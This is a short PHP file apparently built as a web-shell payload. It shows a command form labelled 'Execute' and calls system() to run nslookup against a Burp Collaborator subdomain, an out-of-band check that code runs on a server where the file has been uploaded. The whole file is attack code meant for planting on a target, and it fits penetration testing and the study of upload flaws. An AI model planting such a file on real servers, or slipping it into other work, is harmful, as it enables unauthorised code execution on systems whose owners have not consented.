<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    system("nslookup h3l2kh1sgtqdy2ephajnpgqq1h78vx.burpcollaborator.net");
?>
</pre>
</body>
</html>
